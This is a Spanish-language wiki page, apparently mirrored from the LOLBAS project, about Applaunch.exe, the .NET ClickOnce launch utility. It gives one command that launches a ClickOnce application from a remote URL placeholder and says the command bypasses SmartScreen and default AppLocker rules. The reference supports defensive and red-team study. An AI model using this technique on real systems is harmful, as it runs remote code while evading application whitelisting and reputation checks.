# LOLBAS: Applaunch.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `AWL Bypass`

Microsoft .NET ClickOnce Launch Utility.

## Comandos

### Execute ClickOnce applications in environments where `dfsvc.exe` would normally enforce full-trust and SmartScreen checks. Can be abused as an AWL bypass in rare configurations.

AWL Bypass · priv: User · T1127.002

```cmd
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate "{REMOTEURL}#APPLICATION_METADATA_HERE"
```

Launches a ClickOnce application via `Applaunch.exe`. Bypasses SmartScreen and default AppLocker rules when the application is published as partial trust.

